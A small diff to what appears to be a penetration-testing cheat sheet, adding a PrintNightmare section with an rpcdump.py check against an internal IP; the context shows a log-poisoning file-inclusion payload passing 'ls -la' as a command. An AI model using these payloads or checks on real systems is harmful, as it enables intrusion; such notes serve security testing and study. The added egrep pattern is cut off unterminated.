@@ -963,3 +963,8 @@ DATA
 #RCE
 ?page=/var/log/mail&cmd=ls -la
 ```
+
+[print nightmare]
+# check if vulnerable
+rpcdump.py @10.10.120.242 | egrep 'MS-RPRN|MS-PAR
+
